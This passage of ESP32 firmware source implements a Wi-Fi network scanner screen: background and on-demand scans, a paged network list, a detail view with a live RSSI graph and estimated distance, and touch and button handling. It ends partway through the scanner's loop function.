static void stopBgWifiScanIfRunning() {
  if (fgWifiScanInProgress) return;
  if (!bgScanRunning && WiFi.scanComplete() != WIFI_SCAN_RUNNING) return;
  if (WiFi.scanComplete() != WIFI_SCAN_RUNNING) {
    bgScanRunning = false;
    return;
  }
  (void)esp_wifi_scan_stop();
  const uint32_t start = millis();
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && (millis() - start) < 5000u) {
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
  bgScanRunning = false;
}

static void bgWifiScanTask(void* ) {
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoWifiScan && idleOk && !feature_active && !in_sub_menu) {

      if (!bgScanRunning) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        WiFi.scanDelete();
        const uint32_t dwell = wifiStaScanMsPerChannel();
        int ret = WiFi.scanNetworks(true, true, false, dwell);

        bgScanRunning = (ret == WIFI_SCAN_RUNNING);
        if (ret >= 0) {

          bgHasResults = true;
          bgLastScanMs = now;
          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
        } else if (!bgScanRunning) {

          vTaskDelay(2000 / portTICK_PERIOD_MS);
        } else {
          vTaskDelay(250 / portTICK_PERIOD_MS);
        }
      } else {
        int n = WiFi.scanComplete();
        if (n >= 0) {
          bgHasResults = true;
          bgLastScanMs = now;
          bgScanRunning = false;
          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
        } else if (n == WIFI_SCAN_FAILED) {
          bgScanRunning = false;
          WiFi.scanDelete();
          vTaskDelay(2000 / portTICK_PERIOD_MS);
        } else {

          vTaskDelay(250 / portTICK_PERIOD_MS);
        }
      }
    } else {
      // Only cancel our async background scan — sync feature scans also report RUNNING.
      if (bgScanRunning) {
        stopBgWifiScanIfRunning();
      }
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void startBackgroundScanner() {
  if (bgScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgWifiScanTask,
    "bgWifiScan",
    4096,
    nullptr,
    1,
    &bgScanTaskHandle,
    0
  );
}

int getLastCount() {

  if (!settings().autoWifiScan) return 0;
  int n = WiFi.scanComplete();
  return (n < 0) ? 0 : n;
}

bool wifiCacheValidForReuse() {
  if (!settings().autoWifiScan || !bgHasResults) return false;
  return WiFi.scanComplete() > 0;
}

int staWifiScanSync() {
  pauseBackgroundRadioTasks();
  if (bgScanRunning) {
    stopBgWifiScanIfRunning();
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  const uint32_t dwell = wifiStaScanMsPerChannel();
  fgWifiScanInProgress = true;
  const int n = WiFi.scanNetworks(false, true, false, dwell);
  fgWifiScanInProgress = false;
  if (n >= 0) {
    bgHasResults = true;
    bgLastScanMs = millis();
  }
  return n;
}

bool loadApListFromWifiCache(wifi_ap_record_t** ap_list, int* network_count,
                             int (*compare_ap)(const void*, const void*)) {
  if (!wifiCacheValidForReuse() || !ap_list || !network_count || !compare_ap) {
    return false;
  }
  const int n = WiFi.scanComplete();
  if (n <= 0) return false;

  if (*ap_list) {
    free(*ap_list);
    *ap_list = nullptr;
  }
  *network_count = n;
  *ap_list = (wifi_ap_record_t*)malloc((size_t)n * sizeof(wifi_ap_record_t));
  if (!*ap_list) {
    *network_count = 0;
    return false;
  }
  for (int i = 0; i < n; i++) {
    wifi_ap_record_t ap_record = {};
    memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
    strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
    ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
    ap_record.rssi = WiFi.RSSI(i);
    ap_record.primary = WiFi.channel(i);
    ap_record.authmode = WiFi.encryptionType(i);
    (*ap_list)[i] = ap_record;
  }
  qsort(*ap_list, (size_t)n, sizeof(wifi_ap_record_t), compare_ap);
  return true;
}

unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

#define MAX_SSID_LENGTH 10

// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;

static int wifiNetworksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void wifiScanClearBody() {
  wifiClearBody(TFT_BLACK);
}

static void wifiScanUpdateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (isDetailView) {
    setTouchNavLabels("Back", nullptr, nullptr, nullptr, "Scan");
  } else {
    setTouchNavLabels("Back", "Next", "View", "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static int current_page = 0;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    wifiScanUpdateNavLabels();
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

  if (leftButton && leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton && prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton && nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static int last_rendered_page = -1;
static int last_rendered_index = -1;

static void drawNetworkRow(int i, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  String fullSSID = WiFi.SSID(i);
  strncpy(ssid, fullSSID.c_str(), 11);
  ssid[11] = '\0';
  if (fullSSID.length() > 11) strcat(ssid, "...");

  const int rssi = WiFi.RSSI(i);
  const int ch = WiFi.channel(i);
  const int auth = WiFi.encryptionType(i);
  const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, rssi, ch, enc);

  // Clear only this row (avoid overlapping next row).
  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);

  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");

  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : (auth == WIFI_AUTH_OPEN ? ORANGE : WHITE));
  tft.println(buf);
}

void displayWiFiList(bool fullRedraw = false) {
  uiDrawn = false;
  int networkCount = WiFi.scanComplete();

  if (fullRedraw) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    wifiScanClearBody();
    tft.setTextSize(1);
  }

  if (networkCount <= 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No networks found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  // Clamp page in case network count changed.
  const int totalPages = (networkCount + wifiNetworksPerPage() - 1) / wifiNetworksPerPage();
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);

  listStartIndex = current_page * wifiNetworksPerPage();

  const bool pageChanged = (current_page != last_rendered_page);
  const bool needFull = fullRedraw || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    // Full redraw list (keeps UI consistent with Deauther).
    wifiScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Networks:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    int y = LIST_FIRST_ROW_Y;
    const int end_index = min(listStartIndex + wifiNetworksPerPage(), networkCount);
    for (int i = listStartIndex; i < end_index && y < wifiListBottomY(); i++) {
      drawNetworkRow(i, y, (i == currentIndex));
      y += LIST_ROW_H;
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * wifiNetworksPerPage() >= networkCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);
    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    return;
  }

  // Incremental update: only redraw affected rows.
  if (last_rendered_index != currentIndex) {
    const int prev = last_rendered_index;
    const int now = currentIndex;

    if (prev >= listStartIndex && prev < listStartIndex + wifiNetworksPerPage()) {
      const int row = prev - listStartIndex;
      const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
      drawNetworkRow(prev, y, false);
    }
    if (now >= listStartIndex && now < listStartIndex + wifiNetworksPerPage()) {
      const int row = now - listStartIndex;
      const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
      drawNetworkRow(now, y, true);
    }
    last_rendered_index = currentIndex;
  }
}

void displayScanning() {
  uiDrawn = false;
  wifiScanClearBody();

  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, 50);
  tft.println("Scanning.");
  loading(100, ORANGE, 0, 0, 3, true);
  tft.setCursor(10, 65);
  tft.println("Wait a moment.");
  isScanning = false;
}

void startWiFiScan() {
  scan_StartTime = millis();
  isScanning = true;
  exitRequested = false;
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;

  displayScanning();

  pauseBackgroundRadioTasks();
  if (bgScanRunning) {
    stopBgWifiScanIfRunning();
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  const uint32_t dwell = wifiStaScanMsPerChannel();
  fgWifiScanInProgress = true;
  int numNetworks = WiFi.scanNetworks(true, true, false, dwell);
  if (numNetworks == WIFI_SCAN_RUNNING) {
    while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
      if (feature_exit_requested || featureExitButtonPressed()) {
        (void)esp_wifi_scan_stop();
        fgWifiScanInProgress = false;
        isScanning = false;
        feature_exit_requested = true;
        return;
      }
      delay(50);
    }
    numNetworks = WiFi.scanComplete();
  }
  fgWifiScanInProgress = false;
  isScanning = false;

  if (numNetworks >= 0) {
    bgHasResults = true;
    bgLastScanMs = millis();
  }

  displayWiFiList(true);
}

/* ───────────────── Live RSSI history graph (network detail view) ─────────────────
 * While the detail screen is open we repeatedly do a fast, single-channel passive
 * scan of just the selected AP and plot its RSSI over time, so you can walk around
 * and watch the signal rise and fall on a scrolling history trace. The single-channel
 * scan replaces the driver's cached list with a one-channel subset, so on leaving the
 * detail view we rebuild the full list and re-select the network we were viewing.
 */
static const int      kRssiHistLen = 198;      // one stored sample per plot column
static int8_t         s_rssiHist[kRssiHistLen];
static int            s_rssiHistCount = 0;      // valid samples so far (<= len)
static int            s_rssiHistHead  = 0;      // ring-buffer write index
static uint8_t        s_liveBssid[6]  = {0};
static uint8_t        s_liveChannel   = 0;
static bool           s_liveActive    = false;
static uint32_t       s_liveLastMs    = 0;
static const uint32_t kLiveSampleMs   = 400;    // sample cadence
static const uint16_t kLiveDwellMs    = 200;    // per-scan listen time (ms) — long
                                                // enough to reliably catch a ~100 ms
                                                // beacon interval on the target channel
static const int      kRssiLost       = -100;   // sentinel: AP not heard this round

// A passive scan can miss a single beacon window even when the AP is well in range,
// which used to flip the readout to "-- lost --" and dive the trace to the floor on
// every transient miss. Hold the last good reading for a few rounds and only declare
// the AP lost after this many consecutive misses.
static const int      kLostAfterMisses = 3;     // ~1.2 s of real loss before "lost"
static int            s_consecMiss     = 0;
static int            s_lastGoodRssi   = kRssiLost;

// Live "Signal %" and "Est. Distance" detail lines mirror the graph's sampling.
// Distance is EMA-smoothed to tame RSSI jitter; on real loss both freeze and dim.
static bool           s_fieldsInit     = false;
static float          s_distEMA        = 0.0f;
static float          s_shownSignal    = 0.0f;
static float          s_shownDist      = 0.0f;

// Plot geometry. Sits below the "Est. Distance" text (now y=150 after removing the
// static RSSI line). Bottom stays clear of the touch nav bar, which reserves the
// screen below y=293 on V2 (320 - TOUCH_NAV_BAR_H), and of the y=304 button tab bar.
static const int kPlotX0     = 34;    // left edge of trace area
static const int kPlotX1     = 232;   // right edge (newest sample)
static const int kPlotY0     = 176;   // top    -> strong signal (kRssiStrong)
static const int kPlotY1     = 288;   // bottom -> weak signal   (kRssiWeak)
static const int kRssiStrong = -35;   // dBm mapped to kPlotY0
static const int kRssiWeak   = -100;  // dBm mapped to kPlotY1

// Detail-view text row layout — single source of truth for both displayWiFiDetails
// (which prints the labels) and drawLiveFields (which overwrites Signal/Distance live),
// so adding/reordering a row can't silently desync the two.
static const int kDetailRowY0   = 50;   // y of the first row
static const int kDetailRowStep = 20;   // row pitch
enum { kRowSSID = 0, kRowBSSID, kRowSignal, kRowChannel, kRowEnc, kRowDist };
static inline int detailRowY(int row) { return kDetailRowY0 + row * kDetailRowStep; }

static int rssiToY(int rssi) {
  if (rssi > kRssiStrong) rssi = kRssiStrong;
  if (rssi < kRssiWeak)   rssi = kRssiWeak;
  const long span = (long)(kRssiStrong - kRssiWeak);   // 65
  const long frac = (long)(kRssiStrong - rssi);        // 0..span
  return kPlotY0 + (int)((frac * (kPlotY1 - kPlotY0)) / span);
}

static void liveRssiPush(int rssi) {
  s_rssiHist[s_rssiHistHead] = (int8_t)constrain(rssi, -120, 0);
  s_rssiHistHead = (s_rssiHistHead + 1) % kRssiHistLen;
  if (s_rssiHistCount < kRssiHistLen) s_rssiHistCount++;
}

// Single-channel passive scan of just the selected AP. Returns true and sets *out
// when the target BSSID is heard this round.
static bool liveRssiSample(int* out) {
  // Passive scan restricted to the target's channel AND BSSID, so the driver only
  // reports our AP (core >= 2.0.x supports the channel + bssid filter arguments).
  int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true, /*passive=*/true,
                            kLiveDwellMs, s_liveChannel, /*ssid=*/nullptr, s_liveBssid);
  bool found = false;
  for (int i = 0; i < n; i++) {
    const uint8_t* b = WiFi.BSSID(i);
    if (b && memcmp(b, s_liveBssid, 6) == 0) { *out = WiFi.RSSI(i); found = true; break; }
  }
  WiFi.scanDelete();
  return found;
}

static void drawRssiGraph(bool fullFrame) {
  if (fullFrame) {
    tft.setTextSize(1);
    tft.setTextColor(GREEN, TFT_BLACK);
    tft.setCursor(10, kPlotY0 - 14);
    tft.print("RSSI history (live)");
    tft.drawRect(kPlotX0 - 1, kPlotY0 - 1,
                 (kPlotX1 - kPlotX0) + 2, (kPlotY1 - kPlotY0) + 2, TFT_GRAY);
    // dBm axis labels aligned to the gridlines drawn below (-50 / -70 / -90).
    tft.setTextColor(TFT_GRAY, TFT_BLACK);
    for (int gr = -50; gr >= -90; gr -= 20) {
      char lb[6]; snprintf(lb, sizeof(lb), "%d", gr);
      tft.setCursor(2, rssiToY(gr) - 3);
      tft.print(lb);
    }
  }

  // Clear interior, redraw faint gridlines.
  tft.fillRect(kPlotX0, kPlotY0, kPlotX1 - kPlotX0, kPlotY1 - kPlotY0, TFT_BLACK);
  for (int gr = -50; gr >= -90; gr -= 20) {
    tft.drawFastHLine(kPlotX0, rssiToY(gr), kPlotX1 - kPlotX0, L_Dark);
  }

  // Trace: oldest on the left, newest at the right edge.
  int prevX = -1, prevY = -1;
  for (int k = 0; k < s_rssiHistCount; k++) {
    const int idx  = (s_rssiHistHead - s_rssiHistCount + k + kRssiHistLen) % kRssiHistLen;
    const int rssi = s_rssiHist[idx];
    const int x    = kPlotX1 - s_rssiHistCount + k;
    const int y    = rssiToY(rssi);
    if (prevX >= 0) tft.drawLine(prevX, prevY, x, y, GREEN);
    else            tft.drawPixel(x, y, GREEN);
    prevX = x; prevY = y;
  }

  // Current reading readout — on the title row above the plot, so it never covers
  // the newest trace samples (which ride near the top-right when signal is strong).
  const int latest = (s_rssiHistCount > 0)
      ? s_rssiHist[(s_rssiHistHead - 1 + kRssiHistLen) % kRssiHistLen] : 0;
  char buf[16];
  tft.setTextSize(1);
  tft.fillRect(150, kPlotY0 - 15, 84, 12, TFT_BLACK);
  if (s_rssiHistCount > 0 && latest > kRssiLost) {
    snprintf(buf, sizeof(buf), "%d dBm", latest);
    tft.setTextColor(ORANGE, TFT_BLACK);
  } else {
    snprintf(buf, sizeof(buf), "-- lost --");
    tft.setTextColor(TFT_RED, TFT_BLACK);
  }
  tft.setCursor(178, kPlotY0 - 14);
  tft.print(buf);
}

// Begin live sampling for the network shown on the detail screen.
static void liveRssiStart(const uint8_t* bssid, int channel, int seedRssi) {
  if (!bssid) { s_liveActive = false; return; }  // stale/empty scan cache — no target
  memcpy(s_liveBssid, bssid, 6);
  s_liveChannel   = (uint8_t)channel;
  s_rssiHistCount = 0;
  s_rssiHistHead  = 0;
  s_consecMiss    = 0;
  s_lastGoodRssi  = seedRssi;
  s_fieldsInit    = false;    // reset distance smoothing for the new network
  liveRssiPush(seedRssi);     // seed with the cached reading so the graph isn't empty
  s_liveActive = true;
  s_liveLastMs = 0;           // force an immediate first sample
  drawRssiGraph(/*fullFrame=*/true);
}

static void liveRssiStop() { s_liveActive = false; }

// Redraw the "Signal %" and "Est. Distance" detail lines from the current live RSSI
// (y positions match the layout in displayWiFiDetails). Distance is EMA-smoothed; on
// real loss both freeze at their last value and dim (drawn in gray).
static void drawLiveFields(int rssi, bool lost) {
  const int SIGNAL_Y = detailRowY(kRowSignal);
  const int DIST_Y   = detailRowY(kRowDist);
  uint16_t col;
  if (!lost) {
    const float sig  = constrain(2 * (rssi + 100), 0, 100);
    const float dist = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
    if (!s_fieldsInit) { s_distEMA = dist; s_fieldsInit = true; }
    else               { s_distEMA = 0.3f * dist + 0.7f * s_distEMA; }  // light smoothing
    s_shownSignal = sig;
    s_shownDist   = s_distEMA;
    col = WHITE;
  } else {
    col = TFT_GRAY;   // frozen + dimmed
  }
  tft.setTextSize(1);
  tft.setTextColor(col, TFT_BLACK);
  tft.fillRect(10, SIGNAL_Y - 1, 200, 10, TFT_BLACK);
  tft.setCursor(10, SIGNAL_Y);
  tft.print("Signal: "); tft.print(s_shownSignal, 0); tft.print("%");
  tft.fillRect(10, DIST_Y - 1, 200, 10, TFT_BLACK);
  tft.setCursor(10, DIST_Y);
  tft.print("Est. Distance: "); tft.print(s_shownDist, 1); tft.print("m");
}

// Called every loop tick while the detail view is open.
static void liveRssiTick() {
  if (!s_liveActive) return;
  const uint32_t now = millis();
  if (s_liveLastMs != 0 && (now - s_liveLastMs) < kLiveSampleMs) return;
  s_liveLastMs = now;
  int r = 0;
  bool lost = false;
  int displayRssi = s_lastGoodRssi;
  if (liveRssiSample(&r)) {
    s_consecMiss   = 0;
    s_lastGoodRssi = r;
    displayRssi    = r;
    liveRssiPush(r);
  } else {
    // Transient miss: hold the last good reading; only declare the AP lost after
    // several consecutive misses so a single dropped beacon doesn't flicker "lost".
    s_consecMiss++;
    if (s_consecMiss >= kLostAfterMisses) {
      lost = true;
      liveRssiPush(kRssiLost);
    } else {
      displayRssi = s_lastGoodRssi;   // held
      liveRssiPush(s_lastGoodRssi);
    }
  }
  drawRssiGraph(/*fullFrame=*/false);
  drawLiveFields(displayRssi, lost);
}

// After a full rescan, put the cursor back on the network we were viewing.
static void wifiReselectByBssid(const uint8_t* bssid) {
  const int n = WiFi.scanComplete();
  if (n <= 0) return;
  int sel = 0;
  for (int i = 0; i < n; i++) {
    const uint8_t* b = WiFi.BSSID(i);
    if (b && memcmp(b, bssid, 6) == 0) { sel = i; break; }
  }
  currentIndex   = sel;
  current_page   = currentIndex / max(1, wifiNetworksPerPage());
  listStartIndex = current_page * wifiNetworksPerPage();
  displayWiFiList(true);
}

void displayWiFiDetails() {
  uiDrawn = false;
  wifiScanClearBody();

  const int networkCount = WiFi.scanComplete();
  if (networkCount <= 0) {
    isDetailView = false;
    displayWiFiList(true);
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= networkCount) currentIndex = networkCount - 1;

  String ssid = WiFi.SSID(currentIndex);
  String bssid = WiFi.BSSIDstr(currentIndex);
  int rssi = WiFi.RSSI(currentIndex);
  int channel = WiFi.channel(currentIndex);
  int encryption = WiFi.encryptionType(currentIndex);
  bool isHidden = (ssid.length() == 0);

  float signalQuality = constrain(2 * (rssi + 100), 0, 100);
  float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));

  String encryptionType;
  switch (encryption) {
    case WIFI_AUTH_OPEN: encryptionType = "Open"; break;
    case WIFI_AUTH_WEP: encryptionType = "WEP"; break;
    case WIFI_AUTH_WPA_PSK: encryptionType = "WPA"; break;
    case WIFI_AUTH_WPA2_PSK: encryptionType = "WPA2"; break;
    case WIFI_AUTH_WPA_WPA2_PSK: encryptionType = "WPA/WPA2"; break;
    case WIFI_AUTH_WPA2_ENTERPRISE: encryptionType = "WPA2-Ent"; break;
    default: encryptionType = "Unknown"; break;
  }

  // NOTE: In this file TFT_WHITE is remapped to FEATURE_TEXT (orange).
  // Use real WHITE for normal detail text.
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(10, detailRowY(kRowSSID));
  tft.print("SSID: "); tft.print(isHidden ? "(Hidden)" : ssid);

  tft.setCursor(10, detailRowY(kRowBSSID));
  tft.print("BSSID: "); tft.print(bssid);

  // (Static "RSSI:" line removed — the live graph below shows RSSI in real time.)

  tft.setCursor(10, detailRowY(kRowSignal));
  tft.print("Signal: "); tft.print(signalQuality); tft.print("%");

  tft.setCursor(10, detailRowY(kRowChannel));
  tft.print("Channel: "); tft.print(channel);

  tft.setCursor(10, detailRowY(kRowEnc));
  tft.print("Encryption: "); tft.print(encryptionType);

  tft.setCursor(10, detailRowY(kRowDist));
  tft.print("Est. Distance: "); tft.print(estimatedDistance, 1); tft.print("m");

  // Live scrolling RSSI history graph under the details.
  liveRssiStart(WiFi.BSSID(currentIndex), channel, rssi);

  drawTabBar("Rescan", false, "", true, "Back", false);
}

void handleButton() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  bool updated = false;
  int oldPage = current_page;

  if (isButtonPressed(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      current_page = currentIndex / max(1, wifiNetworksPerPage());
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_DOWN)) {
    if (!isDetailView && currentIndex < WiFi.scanComplete() - 1) {
      currentIndex++;
      delay(200);
      current_page = currentIndex / max(1, wifiNetworksPerPage());
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      startWiFiScan();
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    // Edge, not level: unlike the other branches here, LEFT's meaning
    // changes depending on state (close detail vs. exit the feature), so a
    // held press must not re-fire it a second time with the new meaning.
    if (isDetailView) {
      liveRssiStop();   // leaving the detail view: stop live sampling
      isDetailView = false;
      updated = true;
    } else {
      feature_exit_requested = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_SELECT)) {
    delay(200);
    if (!isDetailView && !isScanning) {
      isDetailView = true;
      updated = true;
    }
    lastButtonPress = currentMillis;
  }

  if (updated) {
    if (isDetailView) displayWiFiDetails();
    else displayWiFiList(current_page != oldPage);
  }
}

void runUI() {

    static int iconY = STATUS_BAR_Y_OFFSET;

    if (!uiDrawn) {
        tft.drawFastHLine(0, 19, 240, UI_LINE);
        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    if (!isScanning) {
                        startWiFiScan();
                    }
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 120;
    static uint32_t lastTouchActionMs = 0;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        int x, y;
        if (feature_active && readTouchXY(x, y)) {
            const uint32_t nowMs = millis();
            if (nowMs - lastTouchActionMs < 250) {
                lastTouchCheck = millis();
                return;
            }
            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {

                            if (i == 1) {
                                feature_exit_requested = true;
                                lastTouchActionMs = nowMs;
                            } else {

                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                animationState = 1;
                                activeIcon = i;
                                lastAnimationTime = millis();
                                lastTouchActionMs = nowMs;
                            }
                        }
                        break;
                    }
                }
            } else if (!isScanning) {
                const int networkCount = WiFi.scanComplete();

                // Deauther-like bottom bar has a large touch hitbox.
                if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
                    const bool prevDisabled = (current_page == 0);
                    const bool nextDisabled = ((current_page + 1) * wifiNetworksPerPage() >= networkCount);

                    if (x >= 0 && x <= 57) {
                        drawButton(0, 304, 57, 16, "Rescan", true, false);
                        delay(50);
                        startWiFiScan();
                        lastTouchActionMs = nowMs;
                    } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        current_page--;
                        if (current_page < 0) current_page = 0;
                        delay(50);
                        displayWiFiList(true);
                        lastTouchActionMs = nowMs;
                    } else if (x >= 177 && x <= 240) {
                        if (isDetailView) {
                            drawButton(177, 304, 57, 16, "Back", true, false);
                            // Same reason as the BTN_LEFT path in handleButton(): the
                            // live single-channel RSSI scan narrowed the driver's cache
                            // to one AP, so a plain displayWiFiList(true) here would show
                            // a list of one. Rebuild it and keep the selection.
                            uint8_t lastBssid[6];
                            memcpy(lastBssid, s_liveBssid, 6);
                            liveRssiStop();
                            isDetailView = false;
                            delay(50);
                            startWiFiScan();
                            wifiReselectByBssid(lastBssid);
                            lastTouchActionMs = nowMs;
                        } else if (!nextDisabled) {
                            drawButton(177, 304, 57, 16, "Next", true, false);
                            current_page++;
                            delay(50);
                            displayWiFiList(true);
                            lastTouchActionMs = nowMs;
                        }
                    }
                } else if (!isDetailView) {
                    const int listMaxY = LIST_FIRST_ROW_Y + (wifiNetworksPerPage() * LIST_ROW_H);
                    if (networkCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
                        const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
                        const int idx = (current_page * wifiNetworksPerPage()) + row;
                        if (idx >= 0 && idx < networkCount) {
                            currentIndex = idx;
                            isDetailView = true;
                            displayWiFiDetails();
                            lastTouchActionMs = nowMs;
                        }
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void wifiscanSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  wifiScanUpdateNavLabels();
  featureClearContent(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  runUI();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
#endif

  setupTouchscreen();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  if (bgScanRunning) {
    stopBgWifiScanIfRunning();
  }

  int existing = WiFi.scanComplete();
  // With auto scan off, nothing refreshes the WiFi driver cache — reusing it shows stale/partial lists.
  if (settings().autoWifiScan && existing >= 0 && bgHasResults) {
    current_page = 0;
    currentIndex = 0;
    listStartIndex = 0;
    isDetailView = false;
    displayWiFiList(true);
  } else {
    startWiFiScan();
  }

  redrawTouchButtonBar();
}

void wifiscanLoop() {

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  static bool lastDetailView = false;
  static bool lastScanning = true;

  handleButton();
  runUI();
  updateStatusBar();

  if (isScanning) {
    if (!lastScanning) {
      displayScanning();
      lastScanning = true;
    }
  } else if (!isDetailView) {
    if (lastDetailView) {
      // Returning from the detail view: the live single-channel RSSI scans left the
      // driver holding only that channel's APs. Rebuild the full multi-channel list
      // and re-select the network we were just viewing.
      liveRssiStop();
      startWiFiScan();
